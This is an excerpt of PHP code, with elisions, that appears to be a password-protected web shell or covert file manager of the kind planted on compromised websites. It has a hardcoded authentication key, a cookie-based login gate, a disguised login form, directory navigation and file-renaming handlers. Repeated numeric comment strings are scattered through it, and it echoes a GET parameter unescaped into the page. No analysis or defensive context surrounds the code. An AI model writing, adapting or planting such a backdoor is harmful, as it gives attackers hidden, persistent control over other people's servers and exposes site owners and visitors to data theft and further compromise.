...
$auth_key = "5c6f428afd386f36f6bf902fb842d36c";
...
$pass = false;
if (isset($_COOKIE['pw_name_71583'])) {
    if(($_COOKIE['pw_name_71583']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_71583'])) {
        if(($_POST['pw_name_71583']) == $auth_key) {
            setcookie("pw_name_71583", $_POST['pw_name_71583']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_71583' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1730700635669008 1730700635533183 1730700635301561 1730700635567677
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1730700635669008 1730700635533183 1730700635301561 1730700635567677
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1730700635669008 1730700635533183 1730700635301561 1730700635567677
            $name = PATH . "/" . $_GET['r'];
